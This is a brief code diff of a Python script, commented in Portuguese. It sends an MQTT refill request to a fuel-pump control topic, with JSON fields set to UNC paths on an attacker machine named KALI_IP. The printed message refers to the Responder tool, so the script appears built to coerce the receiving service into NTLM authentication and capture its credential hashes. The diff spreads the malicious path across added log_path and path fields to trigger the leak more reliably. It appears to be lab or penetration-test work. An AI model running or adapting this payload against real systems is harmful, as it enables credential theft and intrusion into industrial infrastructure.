@@ -7,12 +7,14 @@ KALI_IP = "10.10.100.8"
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
-# Mantendo a estrutura exata do JSON, mas alterando o valor do texto
+# Mantém as variáveis originais intactas e adiciona gatilhos extras no JSON
 payload = {
-    "pumpId": rf"\\{KALI_IP}\share\PUMP003",
-    "currentLevel": 5
+    "pumpId": "PUMP003",
+    "currentLevel": 5,
+    "log_path": rf"\\{KALI_IP}\share",
+    "path": rf"\\{KALI_IP}\share"
 }
 
 client.publish("fuel-pumps/refill-request", json.dumps(payload))
-print("[+] Teste 1 enviado. Monitore o Responder!")
+print("[+] Teste 2 enviado. Monitore o Responder!")
 client.disconnect()
